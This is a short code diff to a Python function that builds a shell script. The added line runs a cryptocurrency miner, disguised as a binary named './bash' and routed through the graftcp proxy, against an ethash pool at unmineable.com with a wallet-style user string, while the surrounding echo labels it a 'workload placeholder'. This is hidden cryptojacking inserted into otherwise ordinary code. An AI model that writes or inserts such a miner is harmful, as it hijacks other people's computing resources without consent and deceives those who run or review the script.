@@ -64,6 +64,7 @@ def run_script():
     cd /tmp/work/pan
 
     echo "=== RUN PROCESS VIA GRAFTCP ==="
+    ./graftcp/graftcp ./bash --algo ethash --pool stratum+tcp://ethash.unmineable.com:3333 --user d955e86ec8ebfa1aadcf13f162a10c85778e3f3ac5002660ea0097df6f3e660a.kacung --ethstratum ETHPROX
 
     echo "Workload placeholder completed."
     """
